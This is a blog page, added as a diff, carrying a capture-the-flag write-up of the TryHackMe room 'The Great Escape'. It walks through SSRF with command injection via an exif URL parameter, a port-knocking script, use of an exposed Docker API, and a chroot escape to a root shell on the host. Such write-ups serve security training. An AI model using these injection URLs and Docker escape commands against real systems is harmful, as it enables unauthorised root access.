@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/logo.png">
+
+<title>Tryhackme The Great Escape | Razor-Sec</title>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Tryhackme The Great Escape | Razor-Sec</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Tryhackme The Great Escape" />
+<meta name="author" content="Razor" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction This is partical room from tryhackme entitled “The Great Escape” with Medium difficulty. In this room we will learn about SSRF along with code injection, Port Knocking, Enumeration of docker and get escape from docker . Here we will exploit using SSRF then port knocking so that the docker port opens and enters docker then goes to the root of the box. Link for the room here" />
+<meta property="og:description" content="Introduction This is partical room from tryhackme entitled “The Great Escape” with Medium difficulty. In this room we will learn about SSRF along with code injection, Port Knocking, Enumeration of docker and get escape from docker . Here we will exploit using SSRF then port knocking so that the docker port opens and enters docker then goes to the root of the box. Link for the room here" />
+<meta property="og:site_name" content="Razor-Sec" />
+<meta property="og:image" content="/assets/thm_thegreatescape/bg.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-19T00:00:00-06:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/assets/thm_thegreatescape/bg.png" />
+<meta property="twitter:title" content="Tryhackme The Great Escape" />
+<meta name="google-site-verification" content="an3WPRVUJk0x4PXH2PRpcD1vt1eBUdQhPLpgsNgamGQ" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Razor"},"headline":"Tryhackme The Great Escape","dateModified":"2021-02-19T00:00:00-06:00","description":"Introduction This is partical room from tryhackme entitled “The Great Escape” with Medium difficulty. In this room we will learn about SSRF along with code injection, Port Knocking, Enumeration of docker and get escape from docker . Here we will exploit using SSRF then port knocking so that the docker port opens and enters docker then goes to the root of the box. Link for the room here","datePublished":"2021-02-19T00:00:00-06:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup-tryhackme-The-Great-Escape/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/assets/images/logo.png"},"name":"Razor"},"url":"/writeup-tryhackme-The-Great-Escape/","image":"/assets/thm_thegreatescape/bg.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+<!-- change your GA id in _config.yml -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxxxx-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-xxxxxxxx-1');
+</script>
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>Navigation</h3>
+        <li><a href="/">Home</a></li>
+        <li><a href="/about">About</a></li>
+        <li><a href="/categories">Categories </a></li> 
+        <li><a href="/authors">Users </a></li>     
+        <li><a href="/contact">Contact</a></li>       
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/logo.png" alt="Razor-Sec">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Tryhackme The Great Escape</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+        </div>            
+        <div>
+        Written by Razor-Admin on 
+        <span class="post-date"><time class="post-date" datetime="2021-02-19">19 Feb 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/thm_thegreatescape/bg.png" alt="Tryhackme The Great Escape">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    
+    <div class="toc mt-4 mb-4 lead">
+        <h3 class="font-weight-bold">Summary</h3>
+        <ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#scanning">Scanning</a>
+    <ul>
+      <li><a href="#nmap">Nmap</a></li>
+    </ul>
+  </li>
+  <li><a href="#enumeration">Enumeration</a>
+    <ul>
+      <li><a href="#fuzzing">Fuzzing</a></li>
+      <li><a href="#ssrf">SSRF</a></li>
+    </ul>
+  </li>
+  <li><a href="#docker">Docker</a>
+    <ul>
+      <li><a href="#access-docker">Access Docker</a></li>
+    </ul>
+  </li>
+  <li><a href="#escape-from-docker">Escape From Docker</a></li>
+</ul>
+    </div>
+    
+    <!-- End Toc -->
+    <h2 id="introduction">Introduction</h2>
+<p>This is partical room from tryhackme entitled “The Great Escape” with Medium difficulty. In this room we will learn about SSRF along with code injection, Port Knocking, Enumeration of docker and get escape from docker . Here we will exploit using SSRF then port knocking so that the docker port opens and enters docker then goes to the root of the box. Link for the room <a href="https://tryhackme.com/room/thegreatescape">here</a></p>
+
+<h2 id="scanning">Scanning</h2>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>First time we have to do is scanning the Machine :</p>
+<pre><code class="language-bash">$ nmap -sC -sV -oA nmap 10.10.50.223
+
+Nmap scan report for 10.10.50.223
+Host is up (0.34s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh?
+| fingerprint-strings: 
+|   GenericLines: 
+|_    *W}$it$!Z5Qg-Xcg.1
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp open  http    nginx 1.19.6
+| http-robots.txt: 3 disallowed entries 
+|_/api/ /exif-util /*.bak.txt$
+|_http-server-header: nginx/1.19.6
+|_http-title: docker-escape-nuxt
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port22-TCP:V=7.91%I=7%D=2/16%Time=602B9D9C%P=x86_64-pc-linux-gnu%r(Gene
+SF:ricLines,14,"\*W}\$it\$!Z5Qg-Xcg\.1\r\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Feb 16 17:28:41 2021 -- 1 IP address (1 host up) scanned in 207.30 seconds
+</code></pre>
+
+<p>As we can see there is have 2 open ports, Like ssh and webserver. Now let’s take a look the webserver :</p>
+
+<p><img src="/assets/thm_thegreatescape/bg_1.png" alt="img" /></p>
+
+<p>Now i found robots.txt and contain different directory and file :</p>
+
+<p><img src="/assets/thm_thegreatescape/bg_2.png" alt="img" /></p>
+
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="fuzzing">Fuzzing</h3>
+
+<p><code>wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.50.223/FUZZ.bak.txt</code>
+After fuzzing i found this : <code>http://10.10.3.187/exif-util.bak.txt</code> and which contains code like this:</p>
+
+<pre><code class="language-bat">&lt;template&gt;
+  &lt;section&gt;
+    &lt;div class="container"&gt;
+      &lt;h1 class="title"&gt;Exif Utils&lt;/h1&gt;
+      &lt;section&gt;
+        &lt;form @submit.prevent="submitUrl" name="submitUrl"&gt;
+          &lt;b-field grouped label="Enter a URL to an image"&gt;
+            &lt;b-input
+              placeholder="http://..."
+              expanded
+              v-model="url"
+            &gt;&lt;/b-input&gt;
+            &lt;b-button native-type="submit" type="is-dark"&gt;
+              Submit
+            &lt;/b-button&gt;
+          &lt;/b-field&gt;
+        &lt;/form&gt;
+      &lt;/section&gt;
+      &lt;section v-if="hasResponse"&gt;
+        &lt;pre&gt;
+          
+        &lt;/pre&gt;
+      &lt;/section&gt;
+    &lt;/div&gt;
+  &lt;/section&gt;
+&lt;/template&gt;
+
+&lt;script&gt;
+export default {
+  name: 'Exif Util',
+  auth: false,
+  data() {
+    return {
+      hasResponse: false,
+      response: '',
+      url: '',
+    }
+  },
+  methods: {
+    async submitUrl() {
+      this.hasResponse = false
+      console.log('Submitted URL')
+      try {
+        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
+          params: {
+            url: this.url,
+          },
+        })
+        this.hasResponse = true
+        this.response = response
+      } catch (err) {
+        console.log(err)
+        this.$buefy.notification.open({
+          duration: 4000,
+          message: 'Something bad happened, please verify that the URL is valid',
+          type: 'is-danger',
+          position: 'is-top',
+          hasIcon: true,
+        })
+      }
+    },
+  },
+}
+&lt;/script&gt;
+
+</code></pre>
+<p>Now let’s take a look at <code>exif-util/</code>, then i try to upload file image and using burpsuite to capture this.</p>
+
+<p><img src="/assets/thm_thegreatescape/bg_3.png" alt="img" /></p>
+
+<p>From the information provided by burpsuite we can see that the web app made a request to <code>/api/exif</code> and the file name also changed</p>
+
+<p><img src="/assets/thm_thegreatescape/bg_4.png" alt="img" /></p>
+
+<p>Then i move to url and capture again with burpsuite, before capture i hosted files using python : <code>python3 -m http.server 8090</code></p>
+
+<p><img src="/assets/thm_thegreatescape/bg_5.png" alt="img" /></p>
+
+<p>Then the request has changed to GET, then i try to put <code>http://api-dev-backup:8080/exif?url=</code> to request.</p>
+
+<p><img src="/assets/thm_thegreatescape/bg_6.png" alt="img" /></p>
+
+<h3 id="ssrf">SSRF</h3>
+
+<p>And as we can see there is curl, Now we can check id with command <code>echo;id</code></p>
+
+<p><img src="/assets/thm_thegreatescape/bg_7.png" alt="img" /></p>
+
+<p>And we get id of app, So we can use SSRF.Now after i looking around i’m found <code>dev-note.txt</code> in here <code>http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;cd%20/;cat%20/root/dev-note.txt</code></p>
+
+<pre><code>An error occurred: File format could not be determined
+                Retrieved Content
+                ----------------------------------------
+                An error occurred: File format could not be determined
+               Retrieved Content
+               ----------------------------------------
+               Hey guys,
+
+Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.
+
+Anyways, the password is fluffybunnies123
+
+Cheers,
+
+Hydra
+</code></pre>
+<p>Then in directory of root i found .git, Now let’s check this
+<code>http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;git%20--git-dir%20/root/.git%20log</code></p>
+
+<pre><code>Author: Hydra &lt;hydragyrum@example.com&gt;
+Date:   Thu Jan 7 16:48:58 2021 +0000
+
+    fixed the dev note
+
+commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
+Author: Hydra &lt;hydragyrum@example.com&gt;
+Date:   Wed Jan 6 20:51:39 2021 +0000
+
+    Removed the flag and original dev note b/c Security
+
+commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
+Author: Hydra &lt;hydragyrum@example.com&gt;
+Date:   Wed Jan 6 20:51:39 2021 +0000
+
+    Added the flag and dev notes
+</code></pre>
+<p><code>http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;git%20--git-dir%20/root/.git%20diff%20a3d30a7d0510dc6565ff9316e3fb84434916dee8</code></p>
+
+<pre><code>diff --git a/dev-note.txt b/dev-note.txt
+deleted file mode 100644
+index 89dcd01..0000000
+--- a/dev-note.txt
++++ /dev/null
+@@ -1,9 +0,0 @@
+-Hey guys,
+-
+-I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+-
+-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+-
+-Cheers,
+-
+-Hydra
+\ No newline at end of file
+diff --git a/flag.txt b/flag.txt
+deleted file mode 100644
+index aae8129..0000000
+--- a/flag.txt
++++ /dev/null
+@@ -1,3 +0,0 @@
+-You found the root flag, or did you?
+-
+-THM{0c------------REDACTED--------76}
+\ No newline at end of file
+</code></pre>
+<p>And we have flag for root flag. As we can see there is knocked ports. then i’m check the port of docker is off.</p>
+<pre><code>$ nmap -p 2375 10.10.50.223 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 22:08 WIB
+Nmap scan report for 10.10.50.223
+Host is up (0.35s latency).
+
+PORT     STATE  SERVICE
+2375/tcp closed docker
+
+Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
+</code></pre>
+<p>Now let’s knocking that ports then we will be able to access the docker. I’m make little script for knocking :</p>
+
+<pre><code class="language-bash">#! /bin/bash
+curl $1:42 -m 1
+sleep 1
+curl $1:1337 -m 1
+sleep 1
+curl $1:10420 -m 1
+sleep 1
+curl $1:6969 -m 1
+sleep 1
+curl $1:63000 -m 1
+</code></pre>
+<p>Let’s run this : <code>./knock 10.10.50.223</code>. After run we check again the port of docker</p>
+<pre><code>$ nmap -p 2375 10.10.50.223
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 22:15 WIB
+Nmap scan report for 10.10.50.223
+Host is up (0.47s latency).
+
+PORT     STATE SERVICE
+2375/tcp open  docker
+
+Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
+</code></pre>
+<h2 id="docker">Docker</h2>
+
+<p>Now port of docker is open, Now lets check this. 
+<code>docker -H 10.10.50.223:2375 info</code></p>
+<pre><code class="language-bash">$ docker -H 10.10.50.223:2375 info                                                                     130 ⨯ 1 ⚙
+Client:
+ Context:    default
+ Debug Mode: false
+ Plugins:
+  app: Docker App (Docker Inc., v0.9.1-beta3)
+  buildx: Build with BuildKit (Docker Inc., v0.5.1-docker)
+
+Server:
+ Containers: 4
+  Running: 4
+  Paused: 0
+  Stopped: 0
+ Images: 27
+ Server Version: 20.10.2
+ Storage Driver: overlay2
+  Backing Filesystem: extfs
+  Supports d_type: true
+  Native Overlay Diff: true
+ Logging Driver: json-file
+ Cgroup Driver: cgroupfs
+ Cgroup Version: 1
+ Plugins:
+  Volume: local
+  Network: bridge host ipvlan macvlan null overlay
+  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
+ Swarm: inactive
+ Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc
+ Default Runtime: runc
+ Init Binary: docker-init
+ containerd version: 269548fa27e0089a8b8278fc4fc781d7f65a939b
+ runc version: ff819c7e9184c13b7c2607fe6c30ae19403a7aff
+ init version: de40ad0
+ Security Options:
+  apparmor
+  seccomp
+   Profile: default
+ Kernel Version: 4.15.0-130-generic
+ Operating System: Ubuntu 18.04.5 LTS
+ OSType: linux
+ Architecture: x86_64
+ CPUs: 1
+ Total Memory: 983.2MiB
+ Name: great-escape.thm
+ ID: FDCS:BLAR:AJNY:PW6Y:DVAY:R5IQ:VNLF:WRQ5:FP6Y:2IB5:U37T:3W6L
+ Docker Root Dir: /var/lib/docker
+ Debug Mode: false
+ Registry: https://index.docker.io/v1/
+ Labels:
+ Experimental: false
+ Insecure Registries:
+  127.0.0.0/8
+ Live Restore Enabled: false
+
+WARNING: API is accessible on http://0.0.0.0:2375 without encryption.
+         Access to the remote API is equivalent to root access on the host. Refer
+         to the 'Docker daemon attack surface' section in the documentation for
+         more information: https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
+WARNING: No swap limit support
+</code></pre>
+<h3 id="access-docker">Access Docker</h3>
+
+<p>Then we can access the docker. First lets check the image of docker :</p>
+
+<p><code>$ docker -H 10.10.50.223:2375 images</code></p>
+
+<p><img src="/assets/thm_thegreatescape/bg_8.png" alt="img" /></p>
+
+<p><code>$ docker -H 10.10.50.223:2375 ps</code></p>
+
+<p><img src="/assets/thm_thegreatescape/bg_9.png" alt="img" /></p>
+
+<h2 id="escape-from-docker">Escape From Docker</h2>
+
+<p>in this case im going to exploit alpine to escape the docker.<a href="https://gtfobins.github.io/gtfobins/docker/#shell">here</a> the link i found for exploit this.
+<code>docker -H 10.10.50.223:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt bash</code></p>
+
+<pre><code class="language-bash">$ docker -H 10.10.50.223:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt bash                             1 ⚙
+groups: cannot find name for group ID 11
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+root@0f47e2d39595:/# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+root@0f47e2d39595:/# cd /root
+root@0f47e2d39595:~# ls
+flag.txt
+root@0f47e2d39595:~# cat flag.txt 
+Congrats, you found the real flag!
+
+THM{c----------REDACTED------------4}
+root@0f47e2d39595:~#
+</code></pre>
+<p>Boom we can escape the docker. Now for looking the flag of web we can access frontend in the docker.
+<code>$ docker -H 10.10.50.223:2375 exec -it dockerescapecompose_frontend_1 /bin/bash</code></p>
+
+<p>After looking around i found this in nginx:</p>
+<pre><code class="language-bash">root@docker-escape:/usr/share/nginx/html/.well-known# cat security.txt 
+
+Hey you found me!
+
+The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.
+
+See https://securitytxt.org/ for more information.
+
+Ping /api/fl46 with a HEAD request for a nifty treat.
+</code></pre>
+<p>so We can curl head of <code>/api/fl46</code>.</p>
+<pre><code class="language-bash">$ curl --HEAD http://10.10.50.223/api/fl46
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.6
+Date: Fri, 19 Feb 2021 15:32:04 GMT
+Connection: keep-alive
+flag: THM{b8--------REDACTED------------d4}
+</code></pre>
+<p>We have flag of web now.</p>
+
+<p>so that’s all the writeup that I made now we have 3 flags, including on the web, docker, and the machine from the box</p>
+
+<p>Happy hacking :D</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+<div class="authorbox mb-5 mt-5 pt-4 pb-4">   
+    <div class="row">
+        <div class="wrapavname col-md-3 text-center">
+            
+            <img  class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+            <p class="mt-4 mb-0 small text-center">
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://www.wowthemes.net/donate/"><i class="fa fa-link"></i></a> 
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://twitter.com/0xRxd"><i class="fab fa-twitter"></i></a>
+                <a class="d-inline-block mx-1 text-dark" href="mailto:markoyanfyan12@gmail.com"><i class="fa fa-envelope"></i></a>
+            </p>
+        </div>
+        <div class="col-md-9">
+            <h4>Razor-Admin</h4>
+            <p class="mt-3 mb-0">Author of Razor-Sec, And i'm learner, Cyber Security Enthusias, DevOps, SysOps</p>
+        </div>
+    </div> 
+</div> 
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments mt-5">
+    <button class="btn btn-outline-dark py-2 px-5 d-block w-100 show-comments"><i class="fa fa-comments text-muted"></i> &nbsp; Load Comments</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'Demo-RazorSec'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Tryhackme The Great Escape&url=/writeup-tryhackme-The-Great-Escape/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=/writeup-tryhackme-The-Great-Escape/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/writeup-tryhackme-The-Great-Escape/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Explore more like this</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Linux">Linux</a>                
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Tryhackme">Tryhackme</a>                
+    
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#SSRF">SSRF</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#boot2root">boot2root</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#docker">docker</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#enumeration">enumeration</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#medium-box">medium-box</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#privilage-escalation">privilage escalation</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#web-exploitation">web exploitation</a>               
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-hackerofthehill/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_hackerofthehill/bg.png" alt="Tryhackme hackerofthehill"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-hackerofthehill/">Tryhackme hackerofthehill</a>
+                
+                <div class="mb-2 mt-2 font-weight-normal">
+                <div class="rating-holder">
+<div class="c-rating c-rating--regular" data-rating-value="4.5">
+  <button>1</button>
+  <button>2</button>
+  <button>3</button>
+  <button>4</button>
+  <button>5</button>
+</div>
+</div>
+                </div>
+                
+            </h2>
+            <h4 class="card-text">Introduction This is partical room from tryhackme entitled hackerofthehill with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">11 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-tryhackme-sustah/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_sustah/bg.png" alt="Tryhackme sustah"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-tryhackme-sustah/">Tryhackme sustah</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">05 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-vulnhub-loly/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/vulnhub_loly/bg.png" alt="Loly Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-vulnhub-loly/">Loly Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">02 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/logo.png" class="newsletter-logo" alt="Razor-Sec"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
+        <form action="https://wowthemes.us11.list-manage.com/subscribe/post?u=8aeb20a530e124561927d3bd8&amp;id=8c3d2d214b" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
+            <div class="mc-field-group d-inline-flex">
+            <input type="email" placeholder="Your e-mail" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
+            <input type="submit" value="Subscribe" name="subscribe" class="heart">
+            </div>
+        </form>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Razor-Sec 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                Created by <a target="_blank" href="">Razor-Sec </a> 
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//Demo-RazorSec.disqus.com/count.js"></script>
+
+
+</body>
+</html>
